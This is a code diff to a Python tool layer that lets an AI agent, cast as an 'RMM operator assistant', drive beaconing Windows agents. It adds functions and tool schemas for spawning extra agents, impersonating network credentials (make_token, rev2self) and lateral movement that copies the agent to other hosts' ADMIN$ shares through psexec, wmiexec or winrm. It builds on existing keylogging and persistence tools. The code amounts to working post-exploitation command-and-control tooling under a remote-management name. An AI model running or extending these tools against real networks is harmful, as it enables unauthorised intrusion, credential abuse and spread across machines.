@@ -632,6 +632,7 @@ def tool_deploy_agent_script(
     sleep_seconds: int = 60,
     jitter_percent: int = 30,
     http_proxy: str = "",
+    workspace_id: str = "",
 ) -> str:
     """Render a ready-to-run client_rmm.ps1 configured with the server's active beacon URL and secret."""
     code, data = client.deploy_agent_script(
@@ -639,6 +640,7 @@ def tool_deploy_agent_script(
         sleep_seconds=sleep_seconds,
         jitter_percent=jitter_percent,
         http_proxy=http_proxy,
+        **({"workspace_id": workspace_id} if workspace_id else {}),
     )
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
@@ -651,6 +653,7 @@ def tool_build_go_agent(
     sleep_seconds: int = 60,
     jitter_percent: int = 30,
     http_proxy: str = "",
+    workspace_id: str = "",
 ) -> str:
     """Build the repository Go agent with the server's active connection settings embedded."""
     config = {
@@ -659,6 +662,8 @@ def tool_build_go_agent(
         "jitter_percent": jitter_percent,
         "http_proxy": http_proxy,
     }
+    if workspace_id:
+        config["workspace_id"] = workspace_id
     code, data = client.build_go_agent(
         goos=goos,
         goarch=goarch,
@@ -685,6 +690,133 @@ def tool_install_persistence(client: RmmApiClient, session_ref: str) -> str:
 
 def tool_remove_persistence(client: RmmApiClient, session_ref: str) -> str:
     return tool_queue_command(client, session_ref, "__REMOVE_PERSIST__", cmd_type="oneshot")
+
+
+def tool_spawn_session(
+    client: RmmApiClient,
+    session_ref: str,
+    verify: bool = True,
+    spawn_timeout: float = 120,
+    register_timeout: float = 60,
+    verify_timeout: float = 120,
+) -> str:
+    """Spawn a detached second Go agent from a live Go session and verify both."""
+    sid, info = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.spawn_session(
+        sid,
+        verify=verify,
+        spawn_timeout=spawn_timeout,
+        register_timeout=register_timeout,
+        verify_timeout=verify_timeout,
+    )
+    if code == 408:
+        return _json_result({"ok": False, "error": "timeout", "session_id": sid, "command": "__SPAWN__"})
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "session_id": sid, "data": data})
+    return _json_result({"ok": bool(data.get("ok")), "session_id": sid, "registered": data.get("registered"), "verified": data.get("verified"), "data": data})
+
+
+def tool_make_token(
+    client: RmmApiClient,
+    session_ref: str,
+    user: str,
+    domain: str = "",
+    password: str = "",
+    timeout: float = 120,
+) -> str:
+    """Create a runas /netonly style network identity on a Go agent session."""
+    sid, info = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    if not (user or "").strip():
+        return _json_result({"ok": False, "error": "invalid_credentials", "detail": "user is required"})
+    code, data = client.make_token(sid, domain, user, password, timeout=timeout)
+    if code == 408:
+        return _json_result({"ok": False, "error": "timeout", "session_id": sid, "command": "__MAKE_TOKEN__"})
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "session_id": sid, "data": data})
+    # Report only the identity label and agent output; never the password.
+    return _json_result({
+        "ok": bool(data.get("ok")),
+        "session_id": sid,
+        "identity": data.get("identity"),
+        "output": data.get("output"),
+    })
+
+
+def tool_rev2self(client: RmmApiClient, session_ref: str, timeout: float = 120) -> str:
+    """Revert a Go agent session to its own network identity."""
+    sid, info = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.rev2self(sid, timeout=timeout)
+    if code == 408:
+        return _json_result({"ok": False, "error": "timeout", "session_id": sid, "command": "__REV2SELF__"})
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "session_id": sid, "data": data})
+    return _json_result({"ok": bool(data.get("ok")), "session_id": sid, "output": data.get("output")})
+
+
+def tool_lateral_move(
+    client: RmmApiClient,
+    session_ref: str,
+    method: str,
+    host: str,
+    verify: bool = True,
+    exec_timeout: float = 300,
+    register_timeout: float = 60,
+    verify_timeout: float = 120,
+) -> str:
+    """Start a Go agent on another host through psexec, wmiexec, or winrm."""
+    sid, info = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    method = (method or "").strip().lower()
+    if method not in ("psexec", "wmiexec", "winrm"):
+        return _json_result({
+            "ok": False,
+            "error": "invalid_method",
+            "detail": "method must be psexec, wmiexec, or winrm",
+        })
+    host = (host or "").strip().strip("\\")
+    if not host:
+        return _json_result({"ok": False, "error": "invalid_host"})
+    code, data = client.lateral_move(
+        sid,
+        method,
+        host,
+        verify=verify,
+        exec_timeout=exec_timeout,
+        register_timeout=register_timeout,
+        verify_timeout=verify_timeout,
+    )
+    if code == 408:
+        return _json_result({"ok": False, "error": "timeout", "session_id": sid, "command": "__LATERAL__"})
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "session_id": sid, "data": data})
+    return _json_result({
+        "ok": bool(data.get("ok")),
+        "session_id": sid,
+        "target_session_id": data.get("target_session_id"),
+        "verified": data.get("verified"),
+        "output": data.get("output"),
+        "data": data,
+    })
+
+
+def tool_session_uid(client: RmmApiClient, session_ref: str, timeout: float = 120) -> str:
+    """Show the identity a Go agent runs under, plus any make_token identity."""
+    sid, info = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.session_uid(sid, timeout=timeout)
+    if code == 408:
+        return _json_result({"ok": False, "error": "timeout", "session_id": sid, "command": "__UID__"})
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "session_id": sid, "data": data})
+    return _json_result({"ok": True, "session_id": sid, "output": data.get("output")})
 
 
 TOOL_HANDLERS = {
@@ -789,6 +921,7 @@ TOOL_HANDLERS = {
         int(a.get("sleep_seconds", 60)),
         int(a.get("jitter_percent", 30)),
         a.get("http_proxy", ""),
+        a.get("workspace_id", ""),
     ),
     "build_go_agent": lambda c, a: tool_build_go_agent(
         c,
@@ -798,10 +931,47 @@ TOOL_HANDLERS = {
         int(a.get("sleep_seconds", 60)),
         int(a.get("jitter_percent", 30)),
         a.get("http_proxy", ""),
+        a.get("workspace_id", ""),
     ),
     "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
     "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
     "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
+    "spawn_session": lambda c, a: tool_spawn_session(
+        c,
+        a["session_ref"],
+        bool(a.get("verify", True)),
+        float(a.get("spawn_timeout", 120)),
+        float(a.get("register_timeout", 60)),
+        float(a.get("verify_timeout", 120)),
+    ),
+    "make_token": lambda c, a: tool_make_token(
+        c,
+        a["session_ref"],
+        a["user"],
+        a.get("domain", ""),
+        a.get("password", ""),
+        float(a.get("timeout", 120)),
+    ),
+    "rev2self": lambda c, a: tool_rev2self(
+        c,
+        a["session_ref"],
+        float(a.get("timeout", 120)),
+    ),
+    "lateral_move": lambda c, a: tool_lateral_move(
+        c,
+        a["session_ref"],
+        a["method"],
+        a["host"],
+        bool(a.get("verify", True)),
+        float(a.get("exec_timeout", 300)),
+        float(a.get("register_timeout", 60)),
+        float(a.get("verify_timeout", 120)),
+    ),
+    "session_uid": lambda c, a: tool_session_uid(
+        c,
+        a["session_ref"],
+        float(a.get("timeout", 120)),
+    ),
 }
 
 
@@ -1381,6 +1551,7 @@ OPENAI_TOOLS: list[dict] = [
             "name": "deploy_agent_script",
             "description": "Render a ready-to-run client_rmm.ps1 server-side, configured with the active beacon URL and beacon secret. Returns a portable artifact_ref for queue_upload; the secret is never returned.",
             "parameters": {"type": "object", "properties": {
+                "workspace_id": {"type": "string", "description": "Administrator-selected configured owner; workspace callers inherit their authenticated workspace"},
                 "session_id": {"type": "string", "description": "Optional fixed session ID; default is generated at first run"},
                 "sleep_seconds": {"type": "integer", "description": "Beacon sleep in seconds (1-3600, default 60)"},
                 "jitter_percent": {"type": "integer", "description": "Beacon jitter percent (0-100, default 30)"},
@@ -1394,8 +1565,9 @@ OPENAI_TOOLS: list[dict] = [
             "name": "build_go_agent",
             "description": "Build the repository Go agent on the server with the active beacon URL and secret embedded. Returns the portable artifact_ref, server-local path, binary name, size, and SHA-256 for queue_upload.",
             "parameters": {"type": "object", "properties": {
-                "goos": {"type": "string", "enum": ["windows", "linux", "darwin"], "description": "Target OS (default windows)"},
+                "goos": {"type": "string", "enum": ["windows"], "description": "Target OS (default windows)"},
                 "goarch": {"type": "string", "enum": ["amd64", "arm64"], "description": "Target architecture (default amd64)"},
+                "workspace_id": {"type": "string", "description": "Administrator-selected configured owner; workspace callers inherit their authenticated workspace"},
                 "session_id": {"type": "string", "description": "Optional fixed session ID; default is generated at first run"},
                 "sleep_seconds": {"type": "integer", "description": "Beacon sleep in seconds (default 60)"},
                 "jitter_percent": {"type": "integer", "description": "Beacon jitter percent (default 30)"},
@@ -1482,6 +1654,92 @@ OPENAI_TOOLS: list[dict] = [
             },
         },
     },
+    {
+        "type": "function",
+        "function": {
+            "name": "spawn_session",
+            "description": "Spawn a detached second Go agent from a live Go agent session. The agent-side command starts a separate process with independent standard streams and a fresh session ID, then returns promptly so the parent beacon loop keeps polling. verify=false reports acceptance only (ok=false, pending=true). Waits for the spawned session to register and verifies that both sessions answer a harmless command; report verified=false instead of resubmitting. PowerShell sessions are rejected (spawn requires a Go agent session).",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "verify": {"type": "boolean", "default": True},
+                    "spawn_timeout": {"type": "number", "default": 120},
+                    "register_timeout": {"type": "number", "default": 60},
+                    "verify_timeout": {"type": "number", "default": 120},
+                },
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "make_token",
+            "description": "Create a runas /netonly style network identity on a live Go agent session: subsequent spawned commands keep the agent's local identity but authenticate on the network as DOMAIN\\user. Pass user as DOMAIN\\user or split domain and user. LogonUser does not validate the credentials, so success does not prove the password is correct; test with a network command. NEVER repeat or log the password in responses; report only the identity label and agent output. PowerShell sessions are rejected.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "user": {"type": "string", "description": "Identity as DOMAIN\\user or plain user"},
+                    "domain": {"type": "string", "default": ""},
+                    "password": {"type": "string", "description": "Plaintext password; never echo it back"},
+                    "timeout": {"type": "number", "default": 120},
+                },
+                "required": ["session_ref", "user", "password"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "rev2self",
+            "description": "Revert a Go agent session to its own network identity after make_token. Idempotent: reverting without an active token is a success. PowerShell sessions are rejected.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "timeout": {"type": "number", "default": 120},
+                },
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "lateral_move",
+            "description": "Start a Go agent on another host through a live Go agent session, using psexec, wmiexec, or winrm. The agent stages its own binary on the target's ADMIN$ share and starts it with a fresh session ID; make_token first to use alternate credentials. The call waits for the target session to register and verifies both sessions answer a harmless command; report verified=false instead of resubmitting. Requires an agent binary built with embedded connection settings and admin rights on the target.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "method": {"type": "string", "enum": ["psexec", "wmiexec", "winrm"]},
+                    "host": {"type": "string", "description": "Target hostname or IP address"},
+                    "verify": {"type": "boolean", "default": True},
+                    "exec_timeout": {"type": "number", "default": 300},
+                    "register_timeout": {"type": "number", "default": 60},
+                    "verify_timeout": {"type": "number", "default": 120},
+                },
+                "required": ["session_ref", "method", "host"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "session_uid",
+            "description": "Show the identity a Go agent runs under (process user) plus the active make_token network identity, if any. Use it to verify make_token and rev2self. PowerShell sessions are rejected.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "timeout": {"type": "number", "default": 120},
+                },
+                "required": ["session_ref"],
+            },
+        },
+    },
 ]
 
 SYSTEM_PROMPT = """You are an RMM (Remote Monitoring and Management) operator assistant.
@@ -1493,6 +1751,7 @@ Guidelines:
 - Use list_history / get_history_events for archived (killed) session transcripts.
 - clear_history removes all archived transcripts; delete_history removes one.
 - Prefer exec_command when the user wants command output; use queue_command when beacon sleep is long.
+- Use spawn_session to start a second Go agent on a host that already runs one; never launch an agent binary through a foreground command on an existing session.
 - list_session_downloads shows completed agent→server file pulls; queue_download starts a new pull.
 - Be concise; summarize command output for the user.
 - Destructive actions (kill_session, delete_history, clear_history) require clear user intent.
